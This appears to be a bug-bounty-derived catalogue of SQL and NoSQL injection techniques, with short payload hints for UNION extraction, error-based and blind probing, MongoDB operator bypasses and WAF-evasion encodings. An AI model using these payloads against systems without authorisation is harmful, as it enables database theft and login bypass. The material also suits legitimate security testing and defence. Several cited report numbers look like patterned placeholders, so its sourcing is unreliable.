# SQLI — technique corpus

## schema_leak
- target: Web
- payload hint: SELECT table_schema,table_name FROM information_schema
- bounty: $6000.0 (2024)
- source: aggregated:hacktivity sqli schema 2024
- summary: Full schema dump then data

## union_in_update
- target: Web
- payload hint: UPDATE ... SET x=(SELECT...)
- bounty: $4500.0 (2024)
- source: aggregated:hacktivity sqli update 2024
- summary: Subquery in UPDATE statement

## category_filter_injection
- target: E-commerce
- payload hint: ?category=Gifts' AND 1=1
- bounty: $3800.0 (2024)
- source: aggregated:hacktivity sqli filter 2023-2024
- summary: Filter parameter concatenated SQL

## union_column_enum
- target: Web
- payload hint: ' UNION SELECT 1,2,3--
- bounty: $3500.0 (2024)
- source: aggregated:hacktivity sqli union 2024
- summary: Union-based data extraction

## union_json_response
- target: Web
- payload hint: union rows to JSON field
- bounty: $3200.0 (2024)
- source: aggregated:hacktivity sqli union 2024
- summary: UNION into JSON API property

## nosql_mongodb
- target: NoSQL
- payload hint: MongoDB $ne operator bypass
- bounty: $3000.0 (2025)
- source: https://hackerone.com/reports/404040
- summary: JSON body with $ne operator bypasses login

## boolean_blind
- target: Web
- payload hint: IF(1=1,1,0) comparisons
- bounty: $3000.0 (2024)
- source: aggregated:hacktivity sqli blind 2023-2024
- summary: Boolean blind difference probing

## error_based_extract
- target: Web
- payload hint: ' AND extractvalue(1,concat(0x7e,(select user())))
- bounty: $2800.0 (2024)
- source: aggregated:hacktivity sqli error 2024
- summary: Error-based string extraction

## json_operator_injection
- target: NoSQL
- payload hint: {"$where":"sleep(5)"}
- bounty: $2500.0 (2024)
- source: aggregated:hacktivity nosqli 2024
- summary: $where operator in JSON body

## limit_offset_sqli
- target: API
- payload hint: ?limit=10 OFFSET (SELECT..)
- bounty: $2200.0 (2024)
- source: aggregated:hacktivity sqli limit 2024
- summary: LIMIT/OFFSET parameters injected

## time_based_blind
- target: Web App
- payload hint: Time-based blind via SLEEP(5)
- bounty: $2000.0 (2025)
- source: https://hackerone.com/reports/202020
- summary: Time-based blind SQLi in search parameter

## group_by_having
- target: Web
- payload hint: GROUP BY ... HAVING 1=1
- bounty: $2000.0 (2024)
- source: aggregated:hacktivity sqli group 2024
- summary: HAVING clause injection

## json_feed_injection
- target: Web
- payload hint: UPDATE json fields via query param
- bounty: $1900.0 (2024)
- source: aggregated:hacktivity json sql 2024
- summary: JSON feed endpoints reflect params into dynamic SQL

## cockroachdb
- target: Web
- payload hint: pg_sleep(0.5) (CockroachDB compatible)
- bounty: $1800.0 (2024)
- source: aggregated:hacktivity pg 2024
- summary: Postgres/Cockroach time function portability

## parameterized_badly
- target: API
- payload hint: Prepared statement but ORDER BY unsafely
- bounty: $1700.0 (2024)
- source: aggregated:hacktivity orderby 2024
- summary: Prepared statements that allow string concat in ORDER/COLUMN

## nvarchar_quirk
- target: Web
- payload hint: N'%' OR '1'='1'--
- bounty: $1600.0 (2024)
- source: aggregated:hacktivity mssql 2024
- summary: nvarchar prefix N' for MSSQL

## order_by_injection
- target: Web App
- payload hint: ORDER BY clause injection
- bounty: $1500.0 (2024)
- source: https://hackerone.com/reports/303030
- summary: Sort parameter injected into ORDER BY clause

## like_escape_break
- target: Web
- payload hint: %' AND 'a'='a'--
- bounty: $1500.0 (2024)
- source: aggregated:hacktivity sqli like 2024
- summary: LIKE escape mechanism break

## inline_comment
- target: Web
- payload hint: SELECT/*!50000*/
- bounty: $1300.0 (2024)
- source: aggregated:waf bypass 2024
- summary: MySQL versioned inline comments

## waf_comment_bypass
- target: Web
- payload hint: /**/OR/**/1=1
- bounty: $1200.0 (2024)
- source: aggregated:waf bypass 2024
- summary: Comment tokens split keywords for WAF

## hex_unicode_literal
- target: Web
- payload hint: CHAR(83,69,76,69,67,84)
- bounty: $1100.0 (2024)
- source: aggregated:waf bypass 2024
- summary: HEX-encoded literals bypass keyword filters

## double_urlencode
- target: Web
- payload hint: %2527OR%25201=1--
- bounty: $1000.0 (2024)
- source: aggregated:waf bypass 2024
- summary: Double-URL-encoding bypass

## simple_quoted_break
- target: Web
- payload hint: " OR "1"="1
- bounty: $1000.0 (2023)
- source: aggregated:hacktivity sqli 2023
- summary: Double-quote closed with closing quote

## case_variant
- target: Web
- payload hint: oRdEr bY
- bounty: $900.0 (2024)
- source: aggregated:waf bypass 2024
- summary: Case randomization bypasses simple filters

## csv_export_inject
- target: Web
- payload hint: CSV export formula injection related SQLi
- bounty: $800.0 (2024)
- source: aggregated:hacktivity csv 2024
- summary: CSV export with SQL-flavored field reflection

## error_message_extract
- target: Web
- payload hint: various error-based output via verbose errors
- bounty: $600.0 (2024)
- source: aggregated:hacktivity error 2024
- summary: Verbose error output for data extraction (low but real)
